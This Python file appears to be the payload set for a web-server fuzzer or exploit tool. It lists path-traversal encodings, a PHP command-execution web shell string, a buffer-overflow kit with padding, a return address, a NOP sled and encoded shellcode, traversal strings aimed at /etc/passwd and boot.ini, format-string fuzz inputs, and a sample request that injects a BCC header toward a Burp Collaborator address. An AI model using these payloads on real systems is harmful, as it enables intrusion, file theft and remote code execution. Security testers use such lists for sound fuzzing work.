dots_exploitable = ["..",
                    ".%00.",
                    "..%00",
                    "..%01",
                    ".?", "??", "?.",
                    "%5C..",
                    ".%2e", "%2e.",
                    ".../.",
                    "..../",
                    "%2e%2e", "%%c0%6e%c0%6e",
                    "0x2e0x2e", "%c0.%c0.",
                    "%252e%252e",
                    "%c0%2e%c0%2e", "%c0%ae%c0%ae",
                    "%c0%5e%c0%5e", "%c0%ee%c0%ee",
                    "%c0%fe%c0%fe", "%uff0e%uff0e",
                    "%%32%%65%%32%%65",
                    "%e0%80%ae%e0%80%ae",
                    "%25c0%25ae%25c0%25ae",
                    "%f0%80%80%ae%f0%80%80%ae",
                    "%f8%80%80%80%ae%f8%80%80%80%ae",
                    "%fc%80%80%80%80%ae%fc%80%80%80%80%ae"]

php_cmd_intro = "<?system($_GET['x']);?>"

php_cmd_value = "&x=ls"

junk = "\x42" * 2004

ret = "\x65\x82\xA5\x7C"

NOP = "\x90" * 50

slashes_exploitable = ["/", "\\",
                       "%2f", "%5c",
                       "0x2f", "0x5c",
                       "%252f", "%255c",
                       "%c0%2f", "%c0%af", "%c0%5c", "%c1%9c", "%c1%pc",
                       "%c0%9v", "%c0%qf", "%c1%8s", "%c1%1c", "%c1%af",
                       "%bg%qf", "%u2215", "%u2216", "%uEFC8", "%uF025",
                       "%%32%%66", "%%35%%63",
                       "%e0%80%af",
                       "%25c1%259c", "%25c0%25af",
                       "%f0%80%80%af",
                       "%f8%80%80%80%af"]

Special_Prefix_Patterns = ["A", ".", "./", ".\\"]

Special_Prefixes = ["///", "\\\\\\", "\\\.", "C:\\"]

Special_Mid_Patterns = ["../", "..\\"]

Special_Sufixes = ["%00", "?", " "]#, "%00index.html", "%00index.htm", ";index.html", ";index.htm"]

Special_Patterns = ["..//", "..///", "..\\\\", "..\\\\\\", "../\\", "..\\/",
                    "../\\/", "..\\/\\", "\\../", "/..\\", ".../", "...\\",
                    "./../", ".\\..\\", ".//..//", ".\\\\..\\\\", "......///",
                    "%2e%c0%ae%5c", "%2e%c0%ae%2f"]

request_model = "GET /contact-us HTTP/1.1\n" \
                "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0\n" \
                "Host: insecure-website.com\n" \
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n" \
                "Accept-Language: en-US,en;q=0.5\n" \
                "Accept-Encoding: gzip, deflate\n" \
                "Referer: http://insecure-website.com/contact-us\n" \
                "Content-Type: application/x-www-form-urlencoded\n" \
                "Content-Length: 129\n" \
                "Connection: close\n" \
                "Upgrade - Insecure - Requests: 1\n" \
                "\n" \
                "from=test@test.com%3e%0d%0aBCC%3agxhhuhyoeh6urrfjkxme1j" \
                "pzqqwjkj8b2zumka9@burpcollaborator.net%0d%0ajvi%3a%20j&subject=test&send=1"

request_headers = ["A-IM",
                   "Accept",
                   "Accept-Charset",
                   "Accept-Encoding",
                   "Accept-Language",
                   "Accept-Datetime",
                   "Access-Control-Request-Method",
                   "Access-Control-Request-Headers",
                   "Authorization",
                   "Cache-Control",
                   "Connection",
                   "Content-Length",
                   "Content-Type",
                   "Cookie",
                   "Date",
                   "Expect",
                   "Forwarded",
                   "From",
                   "Host",
                   "If-Match",
                   "If-Modified-Since",
                   "If-None-Match",
                   "If-Range",
                   "If-Unmodified-Since",
                   "Max-Forwards",
                   "Origin",
                   "Pragma",
                   "Proxy-Authorization",
                   "Range",
                   "Referer",
                   "TE",
                   "User-Agent",
                   "Upgrade",
                   "Via",
                   "Warning"
                   "Dnt",
                   "X-Requested-With",
                   "X-CSRF-Token"]

shellcode = "\xdb\xcc\xba\x40\xb6\x7d\xba\xd9\x74\x24\xf4\x58\x29\xc9"
shellcode += "\xb1\x50\x31\x50\x18\x03\x50\x18\x83\xe8\xbc\x54\x88\x46"
shellcode += "\x56\x72\x3e\x5f\x5f\x7b\x3e\x60\xff\x0f\xad\xbb\xdb\x84"
shellcode += "\x6b\xf8\xa8\xe7\x76\x78\xaf\xf8\xf2\x37\xb7\x8d\x5a\xe8"
shellcode += "\xc6\x7a\x2d\x63\xfc\xf7\xaf\x9d\xcd\xc7\x29\xcd\xa9\x08"
shellcode += "\x3d\x09\x70\x42\xb3\x14\xb0\xb8\x38\x2d\x60\x1b\xe9\x27"
shellcode += "\x6d\xe8\xb6\xe3\x6c\x04\x2e\x67\x62\x91\x24\x28\x66\x24"
shellcode += "\xd0\xd4\xba\xad\xaf\xb7\xe6\xad\xce\x84\xd7\x16\x74\x80"
shellcode += "\x54\x99\xfe\xd6\x56\x52\x70\xcb\xcb\xef\x31\xfb\x4d\x98"
shellcode += "\x3f\xb5\x7f\xb4\x10\xb5\xa9\x22\xc2\x2f\x3d\x98\xd6\xc7"
shellcode += "\xca\xad\x24\x47\x60\xad\x99\x1f\x43\xbc\xe6\xdb\x03\xc0"
shellcode += "\xc1\x43\x2a\xdb\x88\xfa\xc1\x2c\x57\xa8\x73\x2f\xa8\x82"
shellcode += "\xeb\xf6\x5f\xd6\x46\x5f\x9f\xce\xcb\x33\x0c\xbc\xb8\xf0"
shellcode += "\xe1\x01\x6d\x08\xd5\xe0\xf9\xe7\x8a\x8a\xaa\x8e\xd2\xc6"
shellcode += "\x24\x35\x0e\x99\x73\x62\xd0\x8f\x11\x9d\x7f\x65\x1a\x4d"
shellcode += "\x17\x21\x49\x40\x01\x7e\x6e\x4b\x82\xd4\x6f\xa4\x4d\x32"
shellcode += "\xc6\xc3\xc7\xeb\x27\x1d\x87\x47\x83\xf7\xd7\xb8\xb8\x90"
shellcode += "\xc0\x40\x78\x19\x58\x4c\x52\x8f\x99\x62\x3c\x5a\x02\xe5"
shellcode += "\xa8\xf9\xa7\x60\xcd\x94\x67\x2a\x24\xa5\x01\x2b\x5c\x71"
shellcode += "\x9b\x56\x91\xb9\x68\x3c\x2f\x7b\xa2\xbf\x8d\x50\x2f\xb2"
shellcode += "\x6b\x91\xe4\x66\x20\x89\x88\x86\x85\x5c\x92\x02\xad\x9f"
shellcode += "\xba\xb6\x7a\x32\x12\x18\xd5\xd8\x95\xcb\x84\x49\xc7\x14"
shellcode += "\xf6\x1a\x4a\x33\xf3\x14\xc7\x3b\x2d\xc2\x17\x3c\xe6\xec"
shellcode += "\x38\x48\x5f\xef\x3a\x8b\x3b\xf0\xeb\x46\x3c\xde\x7c\x88"
shellcode += "\x0c\x3f\x1c\x05\x6f\x16\x22\x79"

container = ["/.:/" + "A" * 5000 + "\x00\x00" + shellcode,
                 "/.../" + "A" * 5000 + "\x00\x00",
                 "/.../.../.../.../.../.../.../.../.../.../",
                 "/../../../../../../../../../../../../etc/passwd",
                 "/../../../../../../../../../../../../boot.ini",
                 "..:..:..:..:..:..:..:..:..:..:..:..:..:",
                 "\\\\*",
                 "\\\\?\\",
                 "/\\" * 5000,
                 "/." * 5000,
                 "!@#$%%^#$%#$@#$%$$@#$%^^**(()",
                 "%01%02%03%04%0a%0d%0aADSF",
                 "%01%02%03@%04%0a%0d%0aADSF",
                 "/%00/",
                 "%00/",
                 "%00",
                 "%u0000",
                 "%\xfe\xf0%\x00\xff",
                 "%\xfe\xf0%\x01\xff" * 20,

                 # format strings.
                 "%n" * 100,
                 "%n" * 500,
                 "\"%n\"" * 500,
                 "%s" * 100,
                 "%s" * 500,
                 "\"%s\"" * 500,

                 # some binary strings.
                 "\xde\xad\xbe\xef",
                 "\xde\xad\xbe\xef" * 10,
                 "\xde\xad\xbe\xef" * 100,
                 "\xde\xad\xbe\xef" * 1000,
                 "\xde\xad\xbe\xef" * 10000,
                 "\x00" * 1000,
                 "\r\n" * 100,
                 "<>" * 500,
                 ]
